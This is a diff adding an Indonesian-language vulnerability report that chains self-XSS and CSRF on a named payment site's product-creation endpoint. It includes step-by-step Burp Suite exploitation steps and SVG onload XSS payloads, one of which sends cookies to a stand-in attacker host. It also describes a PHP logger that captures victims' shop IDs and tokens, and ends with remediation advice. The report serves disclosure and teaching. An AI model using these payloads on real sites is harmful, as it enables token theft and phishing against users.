@@ -1,0 +1,73 @@
+Self XSS to perform Reflected XSS attack via CSRF
+
+Self XSS adalah kerentanan yang bisa membahayakan diri sendiri. Ini terjadi ketika script atau payload yang berbahaya hanya berdampak pada browser pengguna itu sendiri, dan tidak berdampak pada pengguna lain, hampir sama dengan Reflected XSS. Bedanya, Reflected XSS bisa berdampak pada semua pengguna bahkan jika hanya sementara, dan bisa berakibat fatal dalam tujuan tertentu, misalnya mengarahkan ke situs web phising, mencuri cookie dan banyak lagi.
+
+CSRF (Cross Site Request Forgery) adalah serangan eksploitasi web yang dapat membuat pengguna mengirim permintaan atau request ke situs web melalui situs web yang digunakan saat itu tanpa disadari. Dari situ, aplikasi web akan mengeksekusi permintaan itu yang sebenarnya bukan keinginan dari pengguna. Pihak yang tidak bertanggung jawab biasanya menyematkan tautan url link atau pada gambar atau halaman lain. Jika pengguna tidak sengaja mengklik, maka akan dibawa ke halaman web yang mengandung kode berbahaya atau malicious code.
+======================================================================================
+
+
+Skenario:
+Dalam skenario serangan ini, saya mengeksploitasi kombinasi 2 kerentanan, yaitu Self XSS dan CSRF untuk melakukan mencuri cookie dan redirect web phising,
+Selama ini saya tahu bahwa Self XSS hanya berdampak pada dirinya sendiri dan pengguna lain tidak akan merasakan dampaknya.
+
+oleh karena itu agar Self XSS ini memengaruhi pengguna lain, saya mencoba menggabungkan 2 kerentanan ini, Self XSS dan CSRF untuk melakukan XSS tercermin melalui CRF.
+Kemudian dari payload CSRF akan memicu skrip JavaScript untuk menampilkan pop-up yang telah dimasukkan ke dalam payload URL CSRF,
+tapi bukan hanya pop-up yang bahkan bisa mencuri hal-hal seperti x-shop-token dan x-shop-id atau mengarahkan korban ke situs phishing.
+
+Misalnya menggunakan teknik rekayasa sosial karena serangan ini merupakan serangan CSRF atau biasa disebut one click attack,
+penyerang harus membujuk korban untuk login atau korban sudah login tapi belum logout hanya menutup browser yang masih menyimpan history,
+kemudian penyerang mengirimkan URL CSRF kepada korban, jika korban tidak sengaja mengklik URL yang dikirim dari peretas maka korban akan merasakan dampak dari serangan tersebut.
+
+(Sebenarnya untuk skenario ini, tujuan saya adalah mengambil cookie paymes_session.
+tetapi saya tahu bahwa mencuri cookie yang disetel sebagai HttpOnly tidak mungkin dapat dicuri di sisi klien menggunakan skrip JavaScript atau PHP karena HttpOnly hanya dapat diakses di sisi server
+======================================================================================
+
+URL endpoint: https://user.paymes.com/boutique_generate_product.php
+
+step exploit:
+1.Login sebagai hacker di windows 11 lalu pergi ke bagian (Shop --> Add Products) Untuk berpura-pura mebuat produk pada umumnya, Sebelum mengisi form untuk membuat product nyalakan extensi foxy proxy  dan buka burpsuite Masuk ke bagian (Proxy --> HTTP History) Setalah itu minimize burpsite dan isi form pada bagian(add-product) lalu submit (add-ptoduct).
+2.Setelah itu buka Burpsuite kembali, Di dalam Burpsuite Masuk ke bagian (Proxy --> HTTP History) Dan cari title "paymes Dashboard" , lalu klik kanan dibadan request dan kirim ke Repeater.
+3.Masuk ke bagian (Repeater) --> (Content-Disposition: form-data; name="title") Tambahkan atau modifikasi dengan payload: 
+"><svg Only=1 OnLoad=confirm(document.domain)>      --> untuk memicu JavaScript pop-up
+"><svg Only=1 OnLoad=confirm(document.location="YOURSERVER.COM/?c="+document.cookie)>  --> Untuk mencuri x-shop id,token
+4.Lalu klik kanan pilih opsi (Engagement tools --> Generate CSRF POC),lalu klik dibagian (option -->Multipart from --> Include auto-submit script --> Regenerate)  hapus atau hilangkan bagian (<input type="hidden" name="file" value="" />) , dan Copy HTML payload CSRF ke server hacker.
+5. Dan saya membuat script PHP Untuk mecuri x-shop-id dan x-shop-token , Setelah sudah mendapatkan x-shop-id dan x-shop-token nilainya akan ditulis di dalam file log.txt  ,dalam 1 folder bersamaan dengan script PHP dan Payload CSRF.
+6.Setelah semua payload sudah siap script pun bisa dijalankan.dan kirim URL CSRF ke Korban yang sedang login, atau beraktivitas di website,namun bisa juga korban sudah login tetapi belum logout / hanya menutup browser yang masih menyimpan riwayat di browser,apabila korban mengakses URL yang dikirim dari hacker maka akan berdampak ke korban, yang dimana data-data milik korban akan di tulis di server hacker.seperti x-shop-id dan x-shop-token milik korban.
+7.Pada langkah terakhir ini saya pindah ke mesin Kali Linux sebagi Korban yang telah ditipu hacker untuk mengakses URL yang diberikan, Dan ternyata setalah di akses oleh korban URL tersebut benar mengalihkan ke URL jahat atau website phising.
+8.Sebagai hacker yang telah berhasil menipu korban periksan ke bagian file log.txt , disitu sudah tertulis data milik korban seperti ip,user agent,cookie shop-id dan shop-token
+
+Impac:
+1.pencurian cookie id - token
+2.reputasi perusahaan turun
+3.pengalihan url ke website phising
+
+rekomendasi:
+FOR XSS
+Gunaka htmlspecialchars()
+Gunakan fungsi PHP strip_tags()
+Validasi Input user
+
+
+ FOR CSRF
+Secret Validation Token
+Random Validation Token
+gunakan server-side frameworks yang dilengkapi dengan token anti-CSRF bawaan
+
+1.https://learn.microsoft.com/id-id/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0
+2.https://owasp.org/www-community/attacks/xss
+3.https://learn.microsoft.com/id-id/aspnet/web-api/overview/security/preventing-cross-site-request-forgery-csrf-attacks
+4.https://owasp.org/www-community/attacks/csrf
+
+
+url endpoint: https://user.paymes.com/boutique_generate_product.php
+
+
+
+
+
+
+1.Virtual Box Kali Linux mozila 102.8.0esr (64-bit)
+user agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+
+2.Windows 11 mozila fire fox 111.0.1 (64-bit)
+user agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
